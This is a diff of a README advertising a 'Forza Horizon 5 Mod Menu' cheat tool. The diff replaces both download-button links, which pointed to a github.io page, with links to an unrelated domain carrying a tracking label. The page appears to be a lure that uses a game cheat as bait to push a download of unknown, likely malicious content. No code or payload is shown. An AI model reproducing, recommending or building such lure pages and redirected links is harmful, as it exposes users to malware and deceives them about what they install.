@@ -2,7 +2,7 @@
 
 The **Forza Horizon 5 Mod Menu** is the perfect tool for players who want to enhance their racing experience by unlocking a wealth of customization options. From unlocking every car in the game to customizing your vehicles and changing the game’s environment, this mod menu gives you the ability to modify almost every aspect of Forza Horizon 5. Whether you're looking to explore the vast open world, unlock all the cars, or improve your racing performance, the Mod Menu makes it all possible.
 
-[![Download Forza5 ModMenu](https://img.shields.io/badge/Download-Forza5%20ModMenu-blueviolet)](https://forza-horizon-5-mod-menu.github.io/.github/)
+[![Download Forza5 ModMenu](https://img.shields.io/badge/Download-Forza5%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -43,4 +43,4 @@ The **Forza Horizon 5 Mod Menu** is the perfect tool for players who want to enh
 4. **Activate Features**: Use the mod menu to unlock all cars, modify your vehicle’s settings, or change game parameters like speed, weather, and more.
 5. **Enjoy Your Customized Experience**: Explore the game world, race with boosted cars, and experience the fully personalized Forza Horizon 5.
 
-[![Download Forza5 ModMenu](https://img.shields.io/badge/Download-Forza5%20ModMenu-blueviolet)](https://forza-horizon-5-mod-menu.github.io/.github/)
+[![Download Forza5 ModMenu](https://img.shields.io/badge/Download-Forza5%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
